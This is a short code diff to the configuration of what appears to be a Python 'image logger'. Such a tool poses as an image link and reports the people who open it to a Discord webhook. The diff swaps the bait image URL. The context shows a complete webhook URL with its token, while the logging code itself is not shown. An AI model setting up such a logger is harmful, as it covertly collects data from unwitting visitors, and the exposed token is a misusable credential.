@@ -13,7 +13,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1497152272247951480/wOOPO4-dw4CCbKl2zvykQNYFftSYcKDbviA8duLo1_flCPQ-B8G2-5CYQD3BycPgyCQZ",
-    "image": "https://media1.tenor.com/m/GQ1IqDGPMCAAAAAC/spongebob-squarepants-patrick-star.gif", # You can also have a custom image by using a URL argument
+    "image": "https://www.image2url.com/r2/default/images/1777021337685-9a8b933b-9d0b-4852-aa36-16b74fb89502.jfif", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
